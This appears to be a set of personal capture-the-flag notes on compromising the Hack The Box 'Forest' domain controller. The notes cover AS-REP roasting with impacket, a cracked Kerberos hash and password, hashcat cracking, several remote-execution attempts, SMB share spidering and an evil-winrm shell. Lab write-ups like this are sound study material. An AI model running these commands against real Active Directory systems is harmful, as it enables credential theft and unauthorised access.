- Start responder 
```
sudo responder -I tun0
```
- Create wordlist from usernames 
- check for no preauth users with get npusers from impacket
```
impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.domain.txt
```
- Output
```
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f1d92e8069100d3211632fa206366492$8fce52fb998ae5b9355991e862ea90534d371d025b36ad742360b7fff69d9105463067b15841c06058ef41986c87338ffd20397f441dbaa1fdb8d9e24a18bd9339fe35d9b33de372022a00a6590cdc597278af5f362cf1d0d70397e95a1c323542211329a5b4f1f1014cff3748a65d739b4c39ce47472524b3bab650437a7621dbbca97e851196669fa29368c6815db3c447cff039cdd24900fbc61cfb433b626285940e81763b296789ad0cf4bd357f80714d0970f970cc084d195f9c3ece012e15884b8ee235ed130d701247fc60d26bd9781b3a0ab981a17566dc05628a77381860bf9468
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
- Cracking svc-alfresco with mimikatz
```
hashcat -m 18200 hashes.domain.txt /usr/share/wordlists/rockyou.txt --force
```
- Cracked::: s3rvice
- trying psexec
```
impacket-psexec htb.local/svc-alfresco:s3rvice@htb.local
```
- showed shares none writable so it didn't work
- trying smbexec
```
impacket-smbexec htb.local/svc-alfresco:s3rvice@htb.local
```
- didn't work. Denied
- Trying wmiexec
```
impacket-wmiexec htb.local/svc-alfresco:s3rvice@htb.local
```
- Access denied. Moving on to enumerate smb
```
nxc smb -d htb.local -u svc-alfresco -p s3rvice --shares htb.local
```
- Found SYSVOL and NETLOGON are readable
- have command execution by adding -x whoami at the end of the nxc command. Going to try to get a shell with powershell-empire
```
sudo powershell-empire server
```
```
sudo powershell-empire client
```
- Get the empire.db file path from /usr/share/powershell-empire/empire/server/config.yaml
```
location: /var/lib/powershell-empire/server/data/empire.db
```
- Default login
```
username: empireadmin
password: password123
```
- generate the listener on http with an appropriate name
- false alarm we do not have execution through nxc smb -x
- enumerate shares with 
```
nxc smb 10.10.10.161 -d htb.local -u svc-alfresco -p s3rvice -M spider_plus
```
- View shares in /tmp/nxc_hosted/nxc_spider_plus
- Get the files with
```
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```
- nothing valuable in the smb shares
- Need to try evil-winrm 
```
evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
```
- got a shell
- got user
- 
